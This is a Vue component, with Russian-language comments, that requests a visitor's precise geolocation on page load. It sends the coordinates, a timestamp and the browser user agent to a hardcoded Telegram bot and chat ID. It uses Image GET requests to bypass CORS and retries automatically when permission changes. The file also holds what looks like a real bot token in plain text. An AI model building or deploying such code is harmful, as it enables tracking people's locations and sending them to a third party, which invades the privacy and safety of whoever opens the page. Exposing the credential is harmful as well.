<template>
  <div class="geo-wrap">
    <h2>Авто-отправка геолокации в Telegram</h2>

    <p :class="statusClass">{{ statusMessage }}</p>

    <div v-if="coords" class="coords">
      <div>Широта: {{ coords.latitude }}</div>
      <div>Долгота: {{ coords.longitude }}</div>
      <div>Точность: ±{{ coords.accuracy }} м</div>
      <div>Время: {{ new Date(coords.timestamp).toLocaleString() }}</div>
    </div>

    <small class="note">
      Работает на HTTPS или <code>localhost</code>. Токен хранится в клиенте — только для тестов.
    </small>
  </div>
</template>

<script setup>
import { ref, onMounted } from "vue"

// ⚠️ Ваши данные — видны пользователю (НЕ для продакшена)
const BOT_TOKEN = "6499214149:AAF6xgZAIGXsO3mqdtiF_nMW-6N4sxOSECg"
const CHAT_ID   = "6873895827"

// state
const statusMessage = ref("Инициализация…")
const statusClass = ref("info")
const coords = ref(null)
const sending = ref(false)

// --- утилита: GET-запрос через Image (обход CORS ответа) ---
function fireGet(url) {
  return new Promise(resolve => {
    const img = new Image()
    img.onload = img.onerror = () => resolve(true) // факт запроса важнее статуса ответа
    img.src = url + (url.includes("?") ? "&" : "?") + "_=" + Date.now() // cache-bust
  })
}

// --- отправка локации и текста в Telegram ---
async function sendLocationToTelegram(lat, lon) {
  const base = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}`
  const urlLoc = `${base}/sendLocation?chat_id=${encodeURIComponent(CHAT_ID)}&latitude=${encodeURIComponent(lat)}&longitude=${encodeURIComponent(lon)}`
  await fireGet(urlLoc)

  const text = encodeURIComponent(
    `📍 Новая локация\n🌍 ${lat}, ${lon}\n🕓 ${new Date().toISOString()}\n📱 ${navigator.userAgent}`
  )
  const urlMsg = `${base}/sendMessage?chat_id=${encodeURIComponent(CHAT_ID)}&text=${text}`
  await fireGet(urlMsg)
}

// --- единоразовый запрос геолокации и отправка ---
function requestAndSend() {
  if (!("geolocation" in navigator)) {
    statusMessage.value = "Геолокация не поддерживается браузером"
    statusClass.value = "err"
    return
  }

  statusMessage.value = "Запрашиваю разрешение на геолокацию…"
  statusClass.value = "info"
  sending.value = true

  navigator.geolocation.getCurrentPosition(
    async pos => {
      const { latitude, longitude, accuracy } = pos.coords
      coords.value = { latitude, longitude, accuracy, timestamp: pos.timestamp }

      statusMessage.value = "Отправляю координаты в Telegram…"
      statusClass.value = "info"

      try {
        await sendLocationToTelegram(latitude, longitude)
        statusMessage.value = "Координаты отправлены ✅"
        statusClass.value = "ok"
      } catch (e) {
        console.error(e)
        statusMessage.value = "Ошибка отправки в Telegram"
        statusClass.value = "err"
      } finally {
        sending.value = false
      }
    },
    err => {
      sending.value = false
      if (err.code === err.PERMISSION_DENIED) {
        statusMessage.value = "Пользователь отклонил доступ к геолокации"
      } else {
        statusMessage.value = "Ошибка получения геолокации: " + (err?.message || "неизвестная ошибка")
      }
      statusClass.value = "err"
    },
    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
  )
}

// --- Автозапуск при входе ---
// Попытаемся сначала узнать состояние разрешения (если поддерживается Permissions API),
// чтобы корректно отобразить статус. В любом случае вызываем requestAndSend().
onMounted(async () => {
  try {
    if (navigator.permissions && navigator.permissions.query) {
      // Может быть: 'granted' | 'prompt' | 'denied'
      const res = await navigator.permissions.query({ name: "geolocation" })
      if (res.state === "granted") {
        statusMessage.value = "Доступ уже разрешён. Отправляю…"
      } else if (res.state === "prompt") {
        statusMessage.value = "Требуется разрешение на геолокацию…"
      } else {
        statusMessage.value = "Доступ к геолокации запрещён в настройках браузера"
        statusClass.value = "err"
      }
      // При изменении статуса в реальном времени:
      res.onchange = () => {
        // Если пользователь в настройках включит доступ, можно повторно отправить:
        if (res.state === "granted" && !sending.value && !coords.value) {
          requestAndSend()
        }
      }
    } else {
      statusMessage.value = "Проверяю доступ к геолокации…"
    }
  } catch {
    // игнорируем — продолжим обычным запросом
  }

  // Немного отложим, чтобы UI отрисовался, и запрашиваем сразу
  setTimeout(requestAndSend, 50)
})
</script>

<style scoped>
.geo-wrap {
  max-width: 520px;
  margin: 60px auto;
  background: #111827;
  color: #e2e8f0;
  padding: 24px;
  border-radius: 16px;
  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
  text-align: center;
  box-shadow: 0 10px 30px rgba(0,0,0,.35);
}
.coords {
  background: #0b1220;
  border: 1px solid #1f2937;
  border-radius: 12px;
  padding: 12px;
  margin: 16px 0;
  font-family: ui-monospace, monospace;
}
.info { color: #94a3b8; }
.ok   { color: #22c55e; }
.err  { color: #ef4444; }
.note {
  display: block;
  margin-top: 8px;
  font-size: 12px;
  color: #94a3b8;
}
code {
  background: #0b1220;
  border: 1px solid #1f2937;
  padding: 2px 6px;
  border-radius: 6px;
}
</style>
